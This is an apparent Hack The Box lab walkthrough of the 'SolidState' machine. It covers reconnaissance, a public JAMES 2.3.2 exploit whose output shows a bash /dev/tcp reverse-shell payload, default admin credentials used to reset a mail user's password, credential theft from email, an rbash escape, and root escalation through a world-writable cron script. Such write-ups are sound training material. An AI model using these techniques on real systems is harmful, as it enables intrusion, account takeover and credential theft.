# SolidState
SolidState is a medium HTB lab that focuses on mail clients vulnerability, sensitive information disclosure and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

<!-- toc -->

### Reconnaissance
The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
$ sudo nmap -p- -sV -sC 10.129.8.102

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-27 19:22 GMT
Stats: 0:01:53 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 19:26 (0:02:34 remaining)
Nmap scan report for 10.129.8.102
Host is up (0.086s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)
|   256 78b83af660190691f553921d3f48ed53 (ECDSA)
|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 413.05 seconds
```

Found new email id `webadmin@solid-state-security.com` but that domain doesn't give any additional information.

From the nmap scan, we can see that the target machine is running ssh service on port 22, a web server on port 80, 110 for pop3 server and 119 nntp server. After some digging around, finally found the next to check out the port 110 and port 119.

```
$ telnet 10.129.8.102 110

+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 

$ telnet 10.129.8.102 119`.

Trying 10.129.8.102...
Connected to 10.129.8.102.
Escape character is '^]'.
list
200 solidstate NNTP Service Ready, posting permitted
215 list of newsgroups follows
org.apache.james.dev 0 0 y
org.apache.avalon.dev 0 0 y
org.apache.avalon.user 0 0 y
org.apache.james.user 0 0 y
```

### User

##### Web Attack

Searching online for public exploits. we can find two exploit for *JAMES POP3 Server 2.3.2* with `https://www.exploit-db.com/exploits/35513` and `https://www.exploit-db.com/exploits/50347`.
Using the exploit `50347`, to get a new user added as root for management.

```
$ python2.7 50347.py 10.129.8.102 10.10.14.119 4444

('[+]Payload Selected (see script for more options): ', '/bin/bash -i >& /dev/tcp/10.10.14.119/4444 0>&1')
('[+]Example netcat listener syntax to use after successful execution: nc -lvnp', '4444')
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
("[+]Don't forget to start a listener on port", '4444', 'before logging in!')
```

```
$ nc 10.129.8.102 4555

JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
setpassword mindy pass
Password for mindy reset
```

##### Reading leak credentials
Even if no one logged in during the time, we can manual check out the server based on the user added to the server. We can now log-in as the user mindy with the new password and search of any sensitive emails available.

```
$ telnet 10.129.8.102 110

Trying 10.129.8.102...
Connected to 10.129.8.102.
Escape character is '^]'.
user mindy
pass pass
list
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+OK
+OK Welcome mindy
+OK 2 1945
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

##### Getting access as user

Based on these new credentials, we can login and get the flag.

```
$ ssh mindy@10.129.8.102
P@55W0rd1!2@

$ cat user.txt
~FLAG~
```

### Privilege Escalation

We can see that its a restricted shell. We can now look for binaries available to us.

```
mindy@solidstate:~$ cat bin/

cat  env  ls   
```

Tip for rbash Escape from https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html: 
The first thing I try when facing SSH into rbash is adding -t bash to the SSH connection command. This will run bash on connect instead of the assigned shell. It works here (though it does produce a busted prompt), and I an now run id and cd:

```
$ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.129.8.102 -t bash
```
Investigating using pspy32, we can find that root is actually invoking the tmp.py file.

```
$ ./pspy32

2023/12/27 20:42:01 CMD: UID=0     PID=9545   | python /opt/tmp.py 
2023/12/27 20:42:01 CMD: UID=0     PID=9546   | sh -c rm -r /tmp/*  
```
You would find that /opt folder has some additional files which can help with escalation including the tmp.py file above. Also we have write access to this file.

```
$ ls -l /opt/

drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

Updated the code of `tmp.py` to below.

```
$ cat tmp.py

#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ; cat /root/root.txt >> /home/mindy/dummy.txt;')
except:
     sys.exit()
```

Now wait for the script to run again and then we can get flag using `cat ~/dummy.txt`:
```
$ cat ~/dummy.txt
~FLAG~
```
